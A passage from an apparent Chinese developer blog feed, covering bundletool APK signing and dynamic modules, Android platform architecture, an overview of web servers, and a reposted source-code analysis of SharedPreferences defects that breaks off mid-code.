--bundle&#x3D;&#x2F;MyApp&#x2F;my_app.aab --output&#x3D;&#x2F;MyApp&#x2F;my_app.apks</span><br></pre></td></tr></table></figure><p>这个命令构建出来的是没有签名的文件，要有签名的，需要如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">bundletool build-apks --bundle&#x3D;&#x2F;MyApp&#x2F;my_app.aab --output&#x3D;&#x2F;MyApp&#x2F;my_app.apks</span><br><span class="line">--ks&#x3D;&#x2F;MyApp&#x2F;keystore.jks</span><br><span class="line">--ks-pass&#x3D;file:&#x2F;MyApp&#x2F;keystore.pwd</span><br><span class="line">--ks-key-alias&#x3D;MyKeyAlias</span><br><span class="line">--key-pass&#x3D;file:&#x2F;MyApp&#x2F;key.pwd</span><br></pre></td></tr></table></figure><p>这些参数的说明详见如下:<br><img src="https://upload-images.jianshu.io/upload_images/15531792-92dea2409638d009.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br><img src="https://upload-images.jianshu.io/upload_images/15531792-77abd2b18170e37a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>无疑就是一些打包的签名，密码等，还有一些特殊的属性，详细大家可以看英文介绍，使用命令后，出来的是app.apks文件，我们可以解压缩一下，出来就是如下的内容：<br><img src="https://upload-images.jianshu.io/upload_images/15531792-deacc900b5582978.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"><br>从打包出来的东西，更印证了我们前面所说的原理</p></li><li><p>app的签名上传google play</p></li><li><p>将你的包上传到google console</p><h1 id="兼容性问题"><a href="#兼容性问题" class="headerlink" title="兼容性问题"></a>兼容性问题</h1></li></ol><p><strong>Api &lt; 21的手机无法进行模块化</strong>，Google Play会对其进行Multiple Apks操作来进行下发操作。</p><p><strong>Enable on-demand</strong>: 是否启用按需下载，如果不启用，会直接打进Apk</p><p><strong>Fusing</strong>：熔断操作，是否安装到不支持按需下载的设备中</p><p><strong>Module title</strong>:模块标题<br>对于动态组件的一些使用场景</p><p><strong>关于动态模块的一些注意事项</strong><br>当打开on-demand（按需加载）时，必须开启Fusing（熔断操作）才能正常的让Api21以下的手机使用module</p><p>一般情况下，动态模块下发之后需要重启App才能加载成功，但是如果你使用SplitCompat library，就可以立即生效，Access code and resources from downloaded modules</p><p>如果下载的模块太大，需要用户确认，GP要求大于10MB需要用户确认</p><p>国际上可以使用Google Play的Play Core Lib直接从gp后台下载我们上传好的dynamic module.</p><p>module中的AndroidManifest中定义的Activity不能有exported:true因为别的app不知道你何时安装好模块从而会引发问题</p><p>proguard文件在生效的时候会merge base module和所有的dynamic module中的文件，所以在编写proguard的时候要注意这个问题。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Android 架构介绍</title>
      <link href="/2022/02/03/Android-%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D/"/>
      <url>/2022/02/03/Android-%E6%9E%B6%E6%9E%84%E4%BB%8B%E7%BB%8D/</url>
      
        <content type="html"><![CDATA[<p>Android 系统知识博大精深，了解下android系统的整体架构，来自google 官方文档<a href="https://developer.android.com/guide/platform">Platform Architecture</a>:<br>Android 是一个基于 Linux 的开源软件栈，适用于各种类型的android 设备。 下图显示了 Android 平台的主要组件。<br><img src="https://upload-images.jianshu.io/upload_images/15531792-89403936bd699fb8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="image.png"></p><h1 id="Linux-Kernel"><a href="#Linux-Kernel" class="headerlink" title="Linux Kernel"></a>Linux Kernel</h1><p>Android 平台的基础是 Linux 内核。 例如，Android Runtime(ART) 依赖于 Linux 内核来实现线程和低级内存管理等底层功能。<br>使用 Linux 内核使 Android 能够利用关键的安全功能，而且能让设备制造商在熟悉的内核上开发硬件驱动程序。</p><h1 id="Hardware-Abstraction-Layer-HAL"><a href="#Hardware-Abstraction-Layer-HAL" class="headerlink" title="Hardware Abstraction Layer (HAL)"></a>Hardware Abstraction Layer (HAL)</h1><p>硬件抽象层 (HAL) 提供标准接口，将设备硬件功能暴露给更高级别的 Java API 框架。 HAL 由多个库模块组成，每个库模块都为特定类型的硬件组件（例如摄像头或蓝牙模块）实现一个接口。 当Framework API 调用或访问设备硬件时，Android 系统会加载该硬件组件的库模块。</p><h1 id="Android-Runtime"><a href="#Android-Runtime" class="headerlink" title="Android Runtime"></a>Android Runtime</h1><p>对于运行 Android 5.0（API 级别 21）或更高版本的设备，每个应用程序都在自己的进程中运行，并使用自己的 Android 运行时 (ART) 实例。 ART 旨在通过执行 DEX 文件在低内存设备上运行多个虚拟机，DEX是一种专为 Android 设计的字节码格式，已针对最小内存占用进行了优化。构建工具，例如 d8，将 Java 源代码编译成 DEX 字节码，就可以在 Android 平台上运行。</p><p>ART 的一些主要功能包括：</p><ul><li>提前 (AOT) 和即时 (JIT) 编译</li><li>优化的垃圾收集 (GC)</li><li>在 Android 9（API 级别 28）及更高版本上，将应用程序包的 Dalvik 可执行格式 (DEX) 文件转换为更紧凑的机器代码。</li><li>更好的调试支持，包括专用的采样分析器、详细的诊断异常和崩溃报告，以及设置观察点以监控特定字段的能力</li></ul><p>在 Android 5.0（API 级别 21）之前，Dalvik 是 Android 运行时。如果您的应用程序在 ART 上运行良好，那么它应该也可以在 Dalvik 上运行，但反之可能并非如此。<br>Android 还包括一组核心运行时库，它们提供 Java 编程语言的大部分功能，包括 Java API 框架使用的一些 Java 8 语言特性。</p><h1 id="Native-C-C-Libraries"><a href="#Native-C-C-Libraries" class="headerlink" title="Native C/C++ Libraries"></a>Native C/C++ Libraries</h1><p>许多Android 系统核心组件和服务，例如 ART 和 HAL，都是由native 代码(c/c++)构建的， 这些native 代码依赖由C 和 C++ 编写的native 库。 Android 平台提供的 Java Framework API 将其中一些native库的功能公开给应用程序。 例如，您可以通过 Android 框架的 Java OpenGL API 访问 OpenGL ES，在应用程序中支持绘制和操作 2D 和 3D 图形。</p><p>如果您的应用程序是基于C 或 C++ 代码，您可以使用 Android NDK 直接从您的native代码访问其中一些native 平台库。</p><h1 id="Java-API-Framework"><a href="#Java-API-Framework" class="headerlink" title="Java API Framework"></a>Java API Framework</h1><p>您可以通过调用 Java  API 来使用 Android 操作系统的整个功能集。 这些 API 通过简化核心、模块化系统组件和服务的重用，构成了您创建 Android 应用程序所需的构建块，其中包括：</p><ul><li>View System: 丰富且可扩展的View系统，可用于构建应用程序的 UI，包括列表、网格、文本框、按钮，甚至是可嵌入的 Web 浏览器</li><li>Resource Manager 资源管理器，提供对非代码资源的访问，例如本地化字符串、图形和布局文件</li><li>Notificatioin Manager 一个通知管理器，使所有应用程序都可以在状态栏中显示自定义通知</li><li>Activity Manager 一个管理应用程序生命周期并提供通用导航回栈的Activity 管理器</li><li>Content Provider  使应用程序能够访问来自其他应用程序（例如联系人应用程序）的数据或共享自己的数据的content provider 提供程序</li></ul><p>Android 系统程序使用的 Framework API， 开发人员也可以完全访问。</p><h1 id="System-Apps"><a href="#System-Apps" class="headerlink" title="System Apps"></a>System Apps</h1><p>Android 自带的核心应用程序： 电子邮件、短信、日历、互联网浏览、联系人等。 平台附带的应用程序与用户选择安装的应用程序相比没有特殊地位。 因此，第三方应用程序可以成为用户的默认网络浏览器、SMS Messenger，甚至是默认键盘（某些例外情况适用，例如系统的设置应用程序）。</p><p>系统应用程序既可以作为用户应用程序，也可以作为关键功能供开发人员从他们自己的应用程序访问。 例如，如果您的应用程序想要发送 SMS 消息时，您不需要自己构建该功能 - 您可以调用已安装的任何 SMS 应用程序，来向指定的收件人发送消息。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Web 服务器有哪些</title>
      <link href="/2022/02/03/Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%89%E5%93%AA%E4%BA%9B/"/>
      <url>/2022/02/03/Web-%E6%9C%8D%E5%8A%A1%E5%99%A8%E6%9C%89%E5%93%AA%E4%BA%9B/</url>
      
        <content type="html"><![CDATA[<p>作为一名Android开发人员，对于服务器端的知识也需要学习。</p><h1 id="Web-基础知识"><a href="#Web-基础知识" class="headerlink" title="Web 基础知识"></a>Web 基础知识</h1><h3 id="动态网页"><a href="#动态网页" class="headerlink" title="动态网页"></a><a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5/6327050">动态网页</a></h3><p>所谓的动态网页，是指跟静态网页相对的一种网页编程技术。静态网页，随着html代码的生成，页面的内容和显示效果就基本上不会发生变化了——除非你修改页面代码。而动态网页则不然，页面代码虽然没有变，但是显示的内容却是可以随着时间、环境或者数据库操作的结果而发生改变的。</p><p>值得强调的是，不要将动态网页和页面内容是否有动感混为一谈。这里说的动态网页，与网页上的各种动画、滚动字幕等视觉上的动态效果没有直接关系，动态网页也可以是纯文字内容的，也可以是包含各种动画的内容，这些只是网页具体内容的表现形式，无论网页是否具有动态效果，只要是采用了<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91%E7%AB%99/2776858">动态网站</a>技术生成的网页都可以称为动态网页。</p><p>总之，动态网页是基本的html语法规范与Java、VB、VC等高级程序设计语言、数据库编程等多种技术的融合，以期实现对网站内容和风格的高效、动态和交互式的管理。因此，从这个意义上来讲，凡是结合了HTML以外的高级程序设计语言和数据库技术进行的网页编程技术生成的网页都是动态网页。</p><h3 id="ASP"><a href="#ASP" class="headerlink" title="ASP"></a><a href="https://baike.baidu.com/item/asp/128906#:~:text=ASP%E5%8D%B3Active%20Server%20Pages,%E5%BC%BA%E5%A4%A7%E7%9A%84web%E5%BA%94%E7%94%A8%E7%A8%8B%E5%BA%8F%E3%80%82">ASP</a></h3><p>ASP即Active Server Pages，是Microsoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（<em>Hyper Text Markup Language，超文本置标语言</em>）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（<em>包括相关的客户端脚本</em>）和com组件调用。<sup> [1-2]</sup> </p><p>ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （<em>Distributed Component Object Model</em>）和 MTS（<em>Microsoft Transaction Server</em>）的情况下， ASP甚至可以实现中等规模的企业应用程序。</p><h3 id="JSP"><a href="#JSP" class="headerlink" title="JSP"></a><a href="https://baike.baidu.com/item/JSP/141543#:~:text=JSP%EF%BC%88%E5%85%A8%E7%A7%B0JavaServer%20Pages%EF%BC%89%E6%98%AF,%E7%84%B6%E5%90%8E%E8%BF%94%E5%9B%9E%E7%BB%99%E8%AF%B7%E6%B1%82%E8%80%85%E3%80%82">JSP</a></h3><p><strong>JSP</strong>（全称<strong>J</strong>ava<strong>S</strong>erver <strong>P</strong>ages）是由<a href="https://baike.baidu.com/item/Sun%20Microsystems">Sun Microsystems</a>公司主导创建的一种<a href="https://baike.baidu.com/item/%E5%8A%A8%E6%80%81%E7%BD%91%E9%A1%B5%E6%8A%80%E6%9C%AF/9415956">动态网页技术</a>标准。JSP部署于网络服务器上，可以响应客户端发送的请求，并根据请求内容动态地生成<a href="https://baike.baidu.com/item/HTML">HTML</a>、<a href="https://baike.baidu.com/item/XML">XML</a>或其他格式文档的<a href="https://baike.baidu.com/item/Web">Web</a>网页，然后返回给请求者。JSP技术以<a href="https://baike.baidu.com/item/Java">Java</a>语言作为<a href="https://baike.baidu.com/item/%E8%84%9A%E6%9C%AC%E8%AF%AD%E8%A8%80">脚本语言</a>，为用户的<a href="https://baike.baidu.com/item/HTTP">HTTP</a>请求提供服务，并能与服务器上的其它Java程序共同处理复杂的业务需求。</p><p>JSP将Java代码和特定变动内容嵌入到静态的页面中，实现以静态页面为模板，动态生成其中的部分内容。JSP引入了被称为“JSP动作”的XML标签，用来调用内建功能。另外，可以创建JSP标签库，然后像使用标准HTML或XML标签一样使用它们。标签库能增强功能和服务器性能，而且不受<a href="https://baike.baidu.com/item/%E8%B7%A8%E5%B9%B3%E5%8F%B0">跨平台</a>问题的限制。JSP文件在运行时会被其编译器转换成更原始的<a href="https://baike.baidu.com/item/Servlet">Servlet</a>代码。JSP编译器可以把JSP文件编译成用Java代码写的Servlet，然后再由Java编译器来编译成能快速执行的二进制<a href="https://baike.baidu.com/item/%E6%9C%BA%E5%99%A8%E7%A0%81">机器码</a>，也可以直接编译成二进制码。</p><h3 id="Servlet"><a href="#Servlet" class="headerlink" title="Servlet"></a><a href="https://baike.baidu.com/item/Servlet">Servlet</a></h3><p>Servlet（Server Applet）是<a href="https://baike.baidu.com/item/Java/85979">Java</a> Servlet的简称，称为小服务程序或服务连接器，用Java编写的<a href="https://baike.baidu.com/item/%E6%9C%8D%E5%8A%A1%E5%99%A8/100571">服务器</a>端程序，具有独立于平台和<a href="https://baike.baidu.com/item/%E5%8D%8F%E8%AE%AE/13020269">协议</a>的特性，主要功能在于交互式地浏览和生成数据，生成动态<a href="https://baike.baidu.com/item/Web/150564">Web</a>内容。</p><p>狭义的Servlet是指Java语言实现的一个接口，广义的Servlet是指任何实现了这个Servlet接口的类，一般情况下，人们将Servlet理解为后者。Servlet运行于支持Java的应用服务器中。从原理上讲，Servlet可以响应任何类型的请求，但绝大多数情况下Servlet只用来扩展基于<a href="https://baike.baidu.com/item/HTTP%E5%8D%8F%E8%AE%AE/1276942">HTTP协议</a>的Web服务器。</p><p>最早支持Servlet标准的是JavaSoft的Java <a href="https://baike.baidu.com/item/Web%20Server/9306055">Web Server</a>，此后，一些其它的基于Java的Web服务器开始支持标准的Servlet。</p><h3 id="反向代理"><a href="#反向代理" class="headerlink" title="反向代理"></a><a href="https://baike.baidu.com/item/%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86/7793488#:~:text=%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E5%B7%A5%E4%BD%9C%E6%96%B9%E5%BC%8F&text=%E9%80%9A%E5%B8%B8%E7%9A%84%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%EF%BC%8C%E5%8F%AA,%E5%8F%91%E9%80%81%E5%88%B0%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E4%B8%AD%E3%80%82&text=%E5%BD%93%E4%B8%80%E4%B8%AA%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8%E8%83%BD%E5%A4%9F,%E4%B8%BA%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E3%80%82">反向代理</a></h3><p>反向代理服务器位于用户与目标服务器之间，但是对于用户而言，反向代理服务器就相当于目标服务器，即用户直接访问反向代理服务器就可以获得目标服务器的资源。同时，用户不需要知道目标服务器的地址，也无须在用户端作任何设定。反向代理服务器通常可用来作为Web加速，即使用反向代理作为Web服务器的前置机来降低网络和服务器的负载，提高访问效率。</p><p>通常的<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理服务器</a>，只用于代理内部网络对Internet的连接请求，客户机必须指定代理服务器,并将本来要直接发送到Web服务器上的http请求发送到代理服务器中。由于外部网络上的<a href="https://baike.baidu.com/item/%E4%B8%BB%E6%9C%BA">主机</a>并不会配置并使用这个代理服务器，普通代理服务器也被设计为在Internet上搜寻多个不确定的服务器,而不是针对Internet上多个客户机的请求访问某一个固定的服务器，因此普通的Web代理服务器不支持外部对内部网络的访问请求。<strong>当一个代理服务器能够代理外部网络上的主机，访问内部网络时，这种代理服务的方式称为反向代理服务</strong>。此时代理服务器对外就表现为一个Web服务器，外部网络就可以简单把它当作一个标准的Web服务器而不需要特定的配置。不同之处在于，这个服务器没有保存任何网页的真实数据，所有的静态网页或者CGI程序，都保存在内部的Web服务器上。因此对反向<a href="https://baike.baidu.com/item/%E4%BB%A3%E7%90%86%E6%9C%8D%E5%8A%A1%E5%99%A8">代理服务器</a>的攻击并不会使得网页信息遭到破坏，这样就增强了Web服务器的安全性。</p><p>反向代理方式与包过滤方式或普通代理方式并无冲突，因此可以在<a href="https://baike.baidu.com/item/%E9%98%B2%E7%81%AB%E5%A2%99">防火墙</a>设备中同时使用这两种方式，其中反向代理用于外部网络访问内部网络时使用，正向代理或包过滤方式用于拒绝其他外部访问方式并提供内部网络对外部网络的访问能力。因此可以结合这些方式提供最佳的安全访问方式。</p><h1 id="Web-服务器"><a href="#Web-服务器" class="headerlink" title="Web 服务器"></a><a href="https://zhuanlan.zhihu.com/p/347434354#:~:text=%E7%9B%AE%E5%89%8D%E6%9C%80%E4%B8%BB%E6%B5%81%E7%9A%84Web,%E4%B8%BA%E5%A4%A7%E5%AE%B6%E7%AE%80%E5%8D%95%E4%BB%8B%E7%BB%8D%E4%B8%80%E4%B8%8B%E3%80%82">Web 服务器</a></h1><p>Web服务器也可以称为<a href="https://link.zhihu.com/?target=https://www.56vps.cn/server/buy.html">网站服务器</a>，可以用来放置网站文件，供用户浏览。目前最主流的Web服务器有IIS、Apache和Nginx，此外Tomcat的使用也比较常见，另外还有kangle、WebSphere和Weblogic等类型。</p><h3 id="Windows-IIS"><a href="#Windows-IIS" class="headerlink" title="Windows IIS"></a>Windows IIS</h3><p>IIS是Internet Information Server（信息服务）的缩写，也是微软主推的web服务器产品，适用于windows系统，很多著名网站都采用IIS搭建，ASP、.net开发的程序一般也只能在IIS上运行。</p><p>IIS提供了一个图形界面的管理工具，称为 Internet服务管理器，可用于监视配置和控制Internet服务，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面，IIS的使用让网络（包括互联网和局域网）上的信息发布变得非常简单。同时，IIS还提供ISAPI（Intranet Server API）作为扩展Web服务器功能的编程接口，并提供一个Internet数据库连接器，可以实现对数据库的查询和更新。</p><h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>Apache是目前世界上最流行的Web服务器之一，支持跨平台应用，可以运行在几乎所有的Unix、windows、linux系统平台上，尤其对linux的支持相当完美。</p><p>Apache是开源免费的，有很多开发者都参与了设计和改进，推动了产品的持续完善。Apache的特点是简单、高速、性能稳定，可作代理服务器使用。到目前为止，Apache仍然是世界上用的最多的Web服务器，其成功之处主要在于源码开放、强大的社区支持、跨平台应用以及可移植性等方面。不过，Apache是以进程为基础的结构，要比线程消耗更多的系统开支，不太适合于多处理器环境，还有就是并发不强，流量大了就容易出现500错误。</p><h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>Nginx是一种高性能的HTTP和反向代理web服务器，支持高并发和负载均衡，以稳定性、丰富的功能集、示例配置文件和低系统资源的消耗而闻名。</p><p>Nginx可以在大多数Unix/Linux上编译运行，并有Windows移植版。Nginx的安装简单、配置文件简洁（支持perl语法），同时Bug非常少，几乎可以做到7*24不间断运行，支持在不间断服务的情况下进行软件版本升级。在连接高并发的情况下，Nginx是Apache服务不错的替代品。同时Nginx的模块也非常丰富，能够满足不同的需求，适合做静态使用。另外Nginx还提供了IMAP/POP3/SMTP服务，是一个非常优秀的邮件代理服务器。</p><h3 id="Tomcat"><a href="#Tomcat" class="headerlink" title="Tomcat"></a>Tomcat</h3><p>Tomcat是一个开放源代码、运行servlet和JSP Web应用软件、并基于Java的Web应用软件容器。由于技术先进、性能稳定，而且免费，深受Java 爱好者欢迎，同时，也得到了部分软件开发商认可，成为目前比较流行的Web应用服务器。</p><p>Tomcat 属于轻量级应用服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。和IIS等Web服务器一样，tomcat也有处理HTML页面的功能，另外它还是一个Servlet和JSP容器（默认模式下为独立的Servlet容器）。不过，Tomcat处理静态HTML的能力不如Apache服务器，目前Tomcat最新版本为9.0。</p><h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><p>Kangle是一款跨平台、功能强大、易操作的高性能web服务器和反向代理服务器，也是一款专为做虚拟主机研发的web服务器，实现虚拟主机独立进程、独立身份运行与用户安全隔离，支持php、asp、<a href="https://link.zhihu.com/?target=http://asp.net">http://asp.net</a>、java、ruby等多种动态开发语言。</p><p>WebSphere是IBM 的软件平台，包含了编写、运行和监视全天候的工业强度的随需应变Web应用程序和跨平台、跨产品解决方案所需要的整个中间件基础设施，如服务器、服务和工具。WebSphere 是一个模块化的平台，基于业界支持的开放标准，并可在 Intel、Linux 和 z/OS等多平台运行。</p><p>WebLogic是Oracle出品的一款多功能、基于标准的web应用服务器，是一款基于JAVAEE架构的中间件，用于开发、集成、部署和管理大型分布式Web应用、网络应用和数据库应用，将Java的动态功能和安全标准引入大型网络应用的开发、集成、部署和管理之中，为企业构建自己的应用提供了坚实的基础。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 服务器 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SharedPreferences 的缺陷及一点点思考</title>
      <link href="/2021/10/30/SharedPreferences-%E7%9A%84%E7%BC%BA%E9%99%B7%E5%8F%8A%E4%B8%80%E7%82%B9%E7%82%B9%E6%80%9D%E8%80%83/"/>
      <url>/2021/10/30/SharedPreferences-%E7%9A%84%E7%BC%BA%E9%99%B7%E5%8F%8A%E4%B8%80%E7%82%B9%E7%82%B9%E6%80%9D%E8%80%83/</url>
      
        <content type="html"><![CDATA[<p>[转]<a href="https://juejin.cn/post/6932277268110639112">一文读懂 SharedPreferences 的缺陷及一点点思考</a><br>SharedPreferences 是系统提供的一个适合用于存储少量键值对数据的持久化存储方案，结构简单，使用方便，很多应用都会使用到。另一方面，SharedPreferences 存在的问题也挺多的，当中 ANR 问题就屡见不鲜，字节跳动技术团队就曾经发布过一篇文章专门来阐述该问题：<a href="https://link.juejin.cn/?target=https://mp.weixin.qq.com/s?__biz=MzI1MzYzMjE0MQ==&mid=2247484387&idx=1&sn=e3c8d6ef52520c51b5e07306d9750e70&scene=21%23wechat_redirect" title="https://mp.weixin.qq.com/s?__biz=MzI1MzYzMjE0MQ==&amp;mid=2247484387&amp;idx=1&amp;sn=e3c8d6ef52520c51b5e07306d9750e70&amp;scene=21#wechat_redirect">剖析 SharedPreference apply 引起的 ANR 问题</a>。到了现在，Google Jetpack 也推出了一套新的持久化存储方案：DataStore，大有取代 SharedPreferences 的趋势</p><p>本文就结合源码来剖析 SharedPreferences 存在的缺陷以及背后的具体原因，基于 SDK 30 进行分析，让读者做到知其然也知其所以然，并在最后介绍下我个人的一种存储机制设计方案，希望对你有所帮助.</p><h1 id="不得不说的坑"><a href="#不得不说的坑" class="headerlink" title="不得不说的坑"></a>不得不说的坑</h1><blockquote><p>会一直占用内存</p></blockquote><p>SharedPreferences 本身是一个接口，具体的实现类是 SharedPreferencesImpl，Context 中各个和 SP 相关的方法都是由 ContextImpl 来实现的。我们项目中的每个 SP 或多或少都是保存着一些键值对，而每当我们获取到一个 SP 对象时，其对应的数据就会一直被保留在内存中，直到应用进程被终结，因为每个 SP 对象都被系统作为静态变量缓存起来了，对应 ContextImpl 中的静态变量 <code>sSharedPrefsCache</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">class ContextImpl extends Context &#123;</span><br><span class="line">    </span><br><span class="line">    &#x2F;&#x2F;先根据应用包名缓存所有 SharedPreferences</span><br><span class="line">    &#x2F;&#x2F;再根据 xmlFile 和具体的 SharedPreferencesImpl 对应上</span><br><span class="line">    private static ArrayMap&lt;String, ArrayMap&lt;File, SharedPreferencesImpl&gt;&gt; sSharedPrefsCache;</span><br><span class="line"></span><br><span class="line">    &#x2F;&#x2F;根据 fileName 拿到对应的 xmlFile</span><br><span class="line">    private ArrayMap&lt;String, File&gt; mSharedPrefsPaths;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>每个 SP 都对应一个本地磁盘中的 xmlFile，fileName 则是由开发者来显式指定的，每个 xmlFile 都对应一个 SharedPreferencesImpl。所以 ContextImpl 的逻辑是先根据 fileName 拿到 xmlFile，再根据 xmlFile 拿到 SharedPreferencesImpl，最终应用内所有的 SharedPreferencesImpl 就都会被缓存在 <code>sSharedPrefsCache</code> 这个静态变量中。此外，由于 SharedPreferencesImpl 在初始化后就会自动去加载 xmlFile 中的所有键值对数据，而 ContextImpl 内部并没有看到有清理 <code>sSharedPrefsCache</code> 缓存的逻辑，所以 <code>sSharedPrefsCache</code> 会被一直保留在内存中直到进程终结，其内存大小会随着我们引用到的 SP 增多而加大，这就可能会持续占用很大一块内存空间</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">public SharedPreferences getSharedPreferences(String name, int mode) &#123;</span><br><span class="line">    ···</span><br><span class="line">    File file;</span><br><span class="line">    synchronized (ContextImpl.class) &#123;</span><br><span class="line">        if (mSharedPrefsPaths &#x3D;&#x3D; null) &#123;</span><br><span class="line">            mSharedPrefsPaths &#x3D; new ArrayMap&lt;&gt;();</span><br><span class="line">        &#125;</span><br><span class="line">        file &#x3D; mSharedPrefsPaths.get(name);</span><br><span class="line">        if (file &#x3D;&#x3D; null) &#123;</span><br><span class="line">            file &#x3D; getSharedPreferencesPath(name);</span><br><span class="line">            mSharedPrefsPaths.put(name, file);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    return getSharedPreferences(file, mode);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@Override</span><br><span class="line">public SharedPreferences getSharedPreferences(File file, int mode) &#123;</span><br><span class="line">    SharedPreferencesImpl sp;</span><br><span class="line">    synchronized (ContextImpl.class) &#123;</span><br><span class="line">        final ArrayMap&lt;File, SharedPreferencesImpl&gt; cache &#x3D; getSharedPreferencesCacheLocked();</span><br><span class="line">        sp &#x3D; cache.get(file);</span><br><span class="line">        if (sp &#x3D;&#x3D; null) &#123;</span><br><span class="line">            ···</span><br><span class="line">            sp &#x3D; new SharedPreferencesImpl(file, mode);</span><br><span class="line">            cache.put(file, sp);</span><br><span class="line">            return sp;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ···</span><br><span class="line">    return sp;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@GuardedBy(&quot;ContextImpl.class&quot;)</span><br><span class="line">private ArrayMap&lt;File, SharedPreferencesImpl&gt; getSharedPreferencesCacheLocked() &#123;</span><br><span class="line">    if (sSharedPrefsCache &#x3D;&#x3D; null) &#123;</span><br><span class="line">        sSharedPrefsCache &#x3D; new ArrayMap&lt;&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">    final String packageName &#x3D; getPackageName();</span><br><span class="line">    ArrayMap&lt;File, SharedPreferencesImpl&gt; packagePrefs &#x3D; sSharedPrefsCache.get(packageName);</span><br><span class="line">    if (packagePrefs &#x3D;&#x3D; null) &#123;</span><br><span class="line">        packagePrefs &#x3D; new ArrayMap&lt;&gt;();</span><br><span class="line">        sSharedPrefsCache.put(packageName, packagePrefs);</span><br><span class="line">    &#125;</span><br><span class="line">    return packagePrefs;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>GetValue 可能导致线程阻塞</p></blockquote><p>SharedPreferencesImpl 在构造函数中直接就启动了一个子线程去加载磁盘文件，这意味着该操作是一个异步操作（我好像在说废话），如果文件很大或者线程调度系统没有马上启动该线程的话，那么该操作就需要一小段时间后才能执行完毕</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">final class SharedPreferencesImpl implements SharedPreferences &#123;</span><br><span class="line">    </span><br><span class="line">    @UnsupportedAppUsage</span><br><span class="line">    SharedPreferencesImpl(File file, int mode) &#123;</span><br><span class="line">        